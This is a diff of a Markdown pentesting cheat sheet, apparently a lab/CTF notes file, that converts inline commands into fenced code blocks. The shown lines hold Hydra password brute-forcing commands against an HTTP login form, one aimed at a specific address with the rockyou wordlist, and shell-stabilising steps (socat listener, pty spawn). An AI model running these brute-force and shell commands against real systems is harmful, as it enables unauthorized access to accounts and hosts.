@@ -19,17 +19,21 @@ echo '|__end tree'
 
 ### Hydra
 
-`hydra -l <USER> -p <PASSWORD> <IP_ADDRESS> http-post-form "<LOGIN_PAGE>:<REQUEST_BODY>:<ERROR_MESSAGE>"`
+```bash
+hydra -l <USER> -p <PASSWORD> <IP_ADDRESS> http-post-form "<LOGIN_PAGE>:<REQUEST_BODY>:<ERROR_MESSAGE>"
+```
 
 ##### JSON Payload
 
-`hydra -l "root@dasith.works" -P "/usr/share/wordlists/rockyou.txt" -s 3000 10.129.244.81 http-post-form "/api/user/login:{\"email\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:S=Password is wrong:H=content-type: application/json"`
+```bash
+hydra -l "root@dasith.works" -P "/usr/share/wordlists/rockyou.txt" -s 3000 10.129.244.81 http-post-form "/api/user/login:{\"email\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:S=Password is wrong:H=content-type: application/json"
+```
 
 ## TTY
 
 ### Linux
 
-```
+```text
 ctrl + z
 echo $TERM && tput lines && tput cols
 
@@ -54,7 +58,7 @@ socat file:`tty`,raw,echo=0 tcp-listen:1234
 
 Intérprete:
 
-```
+```text
 /usr/bin/script -qc /bin/bash /dev/null
 /bin/sh -i
 python3 -c 'import pty; pty.spawn("/bin/sh")'
